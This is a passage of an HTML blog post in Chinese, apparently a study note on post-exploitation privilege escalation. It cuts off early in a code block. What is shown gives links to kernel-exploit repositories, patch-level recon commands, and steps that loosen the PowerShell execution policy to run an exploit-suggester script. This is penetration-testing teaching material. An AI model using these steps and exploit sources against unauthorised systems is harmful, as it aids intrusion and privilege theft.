@@ -1,0 +1,2595 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="内网权限提升思路总结">
+<title>后渗透之权限提升</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="后渗透之权限提升">
+<meta property='og:description' content="内网权限提升思路总结">
+<meta property='og:url' content='https://lserein.github.io/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-13T11:39:39&#43;08:00'/><meta property='article:modified_time' content='2025-09-13T23:39:50&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/logo.jpg' />
+<meta name="twitter:title" content="后渗透之权限提升">
+<meta name="twitter:description" content="内网权限提升思路总结"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#11系统内核提权">1.1.系统内核提权</a>
+      <ol>
+        <li><a href="#kernelhub-针对常用溢出编号指定找exp">KernelHub 针对常用溢出编号指定找EXP</a></li>
+      </ol>
+    </li>
+    <li><a href="#12配置不当提权"><strong>1.2.配置不当提权</strong></a>
+      <ol>
+        <li><a href="#121使用msf的-service_"><strong>1.2.1.使用MSF的 service_permissions模块进行提权</strong></a></li>
+        <li><a href="#122使用windows可信任服务路径提权">1.2.2.使用Windows可信任服务路径提权</a></li>
+      </ol>
+    </li>
+    <li><a href="#13alwaysinstallelevated提权">1.3.AlwaysInstallElevated提权</a>
+      <ol>
+        <li><a href="#131使用msi-wrapper手动进行提权"><strong>1.3.1.使用MSI Wrapper手动进行提权</strong></a></li>
+        <li><a href="#132使用msf自带的模块进行提权"><strong>1.3.2.使用MSF自带的模块进行提权</strong></a></li>
+        <li><a href="#133直接使用msf生成msi后缀后门">1.3.3.直接使用MSF生成MSI后缀后门</a></li>
+      </ol>
+    </li>
+    <li><a href="#14dll劫持提权">1.4.DLL劫持提权</a></li>
+    <li><a href="#15bypassuac提权">1.5.BypassUAC提权</a>
+      <ol>
+        <li><a href="#151什么是用户账户控制uac">1.5.1.什么是用户账户控制UAC</a></li>
+        <li><a href="#152uac状态">1.5.2.UAC状态</a></li>
+      </ol>
+    </li>
+    <li><a href="#16土豆家族提权">1.6.土豆家族提权</a>
+      <ol>
+        <li><a href="#161juicy-potato"><strong>1.6.1.Juicy Potato</strong></a></li>
+        <li><a href="#162rotten-potato"><strong>1.6.2.Rotten Potato</strong></a></li>
+        <li><a href="#163sweet-potato">1.6.3.Sweet Potato</a></li>
+        <li><a href="#164printspoofer">1.6.4.printSpoofer</a></li>
+        <li><a href="#roguepotato"><strong>1.6.5.</strong>RoguePotato</a></li>
+      </ol>
+    </li>
+    <li><a href="#"><strong>1.7.Windows本地计划任务提权—本地用户</strong></a>
+      <ol>
+        <li><a href="#171at">1.7.1.AT</a></li>
+        <li><a href="#172sc">1.7.2.SC</a></li>
+        <li><a href="#173ps">1.7.3.PS</a></li>
+      </ol>
+    </li>
+    <li><a href="#18进程迁移注入">1.8.进程迁移注入</a>
+      <ol>
+        <li><a href="#181使用pinjector本地进程迁移注入"><strong>1.8.1.使用pinjector本地进程迁移注入</strong></a></li>
+        <li><a href="#182使用msf进程迁移注入">1.8.2.使用MSF进程迁移注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#19令牌窃取提权">1.9.令牌窃取提权</a>
+      <ol>
+        <li><a href="#191烂土豆配合令牌窃取">1.9.1.烂土豆配合令牌窃取</a></li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#21系统内核提权">2.1.系统内核提权</a>
+      <ol>
+        <li><a href="#211cve-2016-5195脏牛漏洞提权">2.1.1.CVE-2016-5195&mdash;脏牛漏洞提权</a></li>
+        <li><a href="#212cve-2024-1086">2.1.2.CVE-2024-1086</a></li>
+        <li><a href="#213cve-2021-4034利用linux-polkit-权限提升漏洞">2.1.3.CVE-2021-4034—利用Linux Polkit 权限提升漏洞</a></li>
+        <li><a href="#214cve-2022-0847linux脏管道提权">2.1.4.CVE-2022-0847&mdash;Linux脏管道提权</a></li>
+        <li><a href="#215cve-2023-0386">2.1.5.CVE-2023-0386</a></li>
+        <li><a href="#216msf中的内核提权模块">2.1.6.MSF中的内核提权模块</a></li>
+        <li><a href="#217linux权限提升信息收集脚本">2.1.7.Linux权限提升信息收集脚本</a></li>
+      </ol>
+    </li>
+    <li><a href="#22suid提权">2.2.SUID提权</a>
+      <ol>
+        <li><a href="#221find-suid提权">2.2.1.find SUID提权</a></li>
+        <li><a href="#"><strong>2.2.2.Vim SUID提权</strong></a></li>
+      </ol>
+    </li>
+    <li><a href="#23sudo提权">2.3.Sudo提权</a>
+      <ol>
+        <li><a href="#231cve-2021-3156sudo提权"><strong>2.3.1.CVE-2021-3156—</strong>sudo提权</a></li>
+        <li><a href="#232cve-2023-22809">2.3.2.CVE-2023-22809</a></li>
+      </ol>
+    </li>
+    <li><a href="#24docker容器逃逸提权">2.4.Docker容器逃逸提权</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#查看是否存在docker环境">查看是否存在docker环境</a></li>
+            <li><a href="#首先以特权模式运行一个docker容器">首先以特权模式运行一个docker容器</a></li>
+            <li><a href="#查看磁盘文件">查看磁盘文件</a></li>
+            <li><a href="#新建一个目录将devvda1挂载至新建的目录">新建一个目录,将/dev/vda1挂载至新建的目录</a></li>
+            <li><a href="#写入计划任务到宿主机">写入计划任务到宿主机</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#25定时任务提权">2.5.定时任务提权</a></li>
+    <li><a href="#26nfs共享服务提权">2.6.NFS共享服务提权</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+                <img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/logo_hu_962ee5f92d8206dc.jpg"
+                        srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/logo_hu_962ee5f92d8206dc.jpg 800w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/logo_hu_6643a595673cdec5.jpg 1600w"
+                        width="800" 
+                        height="800" 
+                        loading="lazy"
+                        alt="Featured image of post 后渗透之权限提升" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                内网安全
+            </a>
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">后渗透之权限提升</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            内网权限提升思路总结
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 13, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 20 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><strong>在学习提权之前，我们有必要来了解一下常见的权限有哪些。</strong></p>
+<p><strong><font style="color:#DF2A3F;">后台权限</font></strong> 所谓的后台权限，就是通过弱口令，SQL注入等手段进入网站的后台。在此权限下，能够执行后台的一些功能，比如发布文章，但是执行的功能也仅仅局限于后台。</p>
+<p><strong><font style="color:#DF2A3F;">数据库权限</font></strong> 一般通过弱口令或注入得到，在此权限下，可以对数据库文件进行修改。</p>
+<p><strong><font style="color:#DF2A3F;">普通权限</font></strong> 包括网站权限和普通的用户权限。</p>
+<p><strong>网站权限就是我们通常获得的Shell，常常通过一些RCE或文件上传，文件包含，反序列化等手段直达Shell。在此权限下，我们可以更改网站的源代码或配置文件，也能收集到操作系统的相关信息。</strong></p>
+<p><strong>用户权限要比网站权限更高一些。</strong></p>
+<p><strong><font style="color:#DF2A3F;">System权限</font></strong> 要么通过高危的系统漏洞，要么通过网站权限等提权得到。在此权限下，就相当于操作自己的电脑。</p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/EUzrh9fbXEhHnlyS9EdQmQ"  target="_blank" rel="noopener"
+    >干货 | 常用提权辅助工具推荐</a></p>
+<h1 id="1windows权限提升">1.Windows权限提升
+</h1><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/1.png"
+	width="1003"
+	height="1197"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/1_hu_6741295f35616e9e.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/1_hu_f2656fccb18d9222.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="83"
+		data-flex-basis="201px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/SecWiki/windows-kernel-exploits </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/WindowsExploits/Exploits </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/AusJock/Privilege-Escalation</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">linux提权辅助脚本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/jondonas/linux-exploit-suggester-2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">windows提权辅助脚本</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/Ethancck/Windows-Exploit-Suggester</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="11系统内核提权">1.1.系统内核提权
+</h2><p><strong>什么是内核提权，就是利用Windows自带的一些漏洞但是目标服务器没有修复打补丁从而进行权限提升</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">whoami</span><span class="w">                       </span><span class="err">#</span><span class="n">查看当前权限</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">whoami</span><span class="w"> </span><span class="o">/</span><span class="n">groups</span><span class="w">               </span><span class="err">#</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">systeminfo</span><span class="w">                   </span><span class="err">#</span><span class="n">查询补丁信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wmic</span><span class="w"> </span><span class="n">qfe</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">Caption</span><span class="p">,</span><span class="n">Description</span><span class="p">,</span><span class="n">HotFixID</span><span class="p">,</span><span class="n">InstalledOn</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wmic</span><span class="w"> </span><span class="n">qfe</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/2.png"
+	width="1721"
+	height="745"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/2_hu_bb1e7e175e43800c.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/2_hu_60674970f572fc6b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="554px"
+	
+></p>
+<p><strong>将补丁编号放到提权辅助页面进行查找：</strong></p>
+<p><a class="link" href="https://i.hacking8.com/tiquan/"  target="_blank" rel="noopener"
+    ><strong>https://i.hacking8.com/tiquan/</strong></a>             已关闭网站</p>
+<p><a class="link" href="https://detect.secwx.com/"  target="_blank" rel="noopener"
+    >https://detect.secwx.com/</a></p>
+<p><strong>使用Powershell脚本进行搜集，执行这个powershell脚本大概率要有足够的权限，不然都不让你用</strong></p>
+<p><a class="link" href="https://github.com/rasta-mouse/Sherlock"  target="_blank" rel="noopener"
+    >https://github.com/rasta-mouse/Sherlock</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">winlog</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="w"> </span><span class="n">get</span><span class="o">-</span><span class="n">executionpolicy</span><span class="w">             </span><span class="c1">//查看当前执行的策略限制</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Restricted</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">winlog</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="w"> </span><span class="n">set</span><span class="o">-</span><span class="n">executionpolicy</span><span class="w"> </span><span class="n">remotesigned</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//RemoteSigned策略允许运行本地脚本和从Internet下载的已签名脚本（已签名很重要，如果没有签名也不能执行）。如果你完全信任你的系统环境</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">Set</span><span class="o">-</span><span class="n">ExecutionPolicy</span><span class="w"> </span><span class="n">Unrestricted</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//请注意，修改执行策略可能需要管理员权限。在运行上述命令时，你可能需要以管理员身份运行PowerShell。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">winlog</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Import</span><span class="o">-</span><span class="n">Module</span><span class="w"> </span><span class="p">.</span><span class="err">\</span><span class="n">Sherlock</span><span class="p">.</span><span class="na">ps1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">winlog</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="w"> </span><span class="p">.</span><span class="err">\</span><span class="n">Sherlock</span><span class="p">.</span><span class="na">ps1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Find</span><span class="o">-</span><span class="n">ALLVulns</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/3.png"
+	width="1438"
+	height="906"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/3_hu_f56024167f5ceb38.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/3_hu_e238f034be7bae0e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="158"
+		data-flex-basis="380px"
+	
+></p>
+<h3 id="kernelhub-针对常用溢出编号指定找exp"><font style="color:rgb(79, 79, 79);">KernelHub 针对常用溢出编号指定找EXP</font>
+</h3><p><a class="link" href="https://github.com/Ascotbe/Kernelhub"  target="_blank" rel="noopener"
+    >https://github.com/Ascotbe/Kernelhub</a></p>
+<h2 id="12配置不当提权"><strong>1.2.配置不当提权</strong>
+</h2><p><strong>Windows在系统启动时，会伴随着一些高权服务启动(windows服务是以system权限运行的)倘若某些服务存在一些漏洞那么就能够借此服务进行权限劫持，例如DLL劫持</strong></p>
+<h3 id="121使用msf的-service_"><strong>1.2.1.使用MSF的 service_permissions模块进行提权</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
